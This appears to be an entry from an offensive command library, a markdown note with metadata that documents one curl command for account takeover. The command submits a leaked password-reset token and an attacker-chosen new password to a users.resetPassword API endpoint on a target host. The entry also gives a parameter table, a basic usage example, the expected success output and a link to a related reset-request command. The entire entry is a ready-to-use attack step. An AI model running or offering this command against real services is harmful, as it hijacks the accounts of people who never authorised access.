---
id: cmd-curl-reset-submit
data: >-
  curl -X POST 'http://target:3000/api/v1/users.resetPassword' -H 'Content-Type:
  application/json' -d
  '{"token":"leaked_token_here","user":{"password":"NewAttackerPass123!"}}'
tags:
  - api
  - takeover
type: command
output: '{"success": true}'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:19.874Z'
verified: false
validated: true
submitted: true
---
# curl-password-reset-submit

## Command

```bash
curl -X POST 'http://target:3000/api/v1/users.resetPassword' -H 'Content-Type: application/json' -d '{"token":"leaked_token_here","user":{"password":"NewAttackerPass123!"}}'
```

## Description

Submits the leaked token and new password to complete the reset.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| token | Leaked value | Yes |
| password | New creds | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'http://target:3000/api/v1/users.resetPassword' -H 'Content-Type: application/json' -d '{"token":"abc123","user":{"password":"pass123"}}'
```

## Expected Output

{"success": true}

## Related

- [[commands/curl-password-reset-request]]
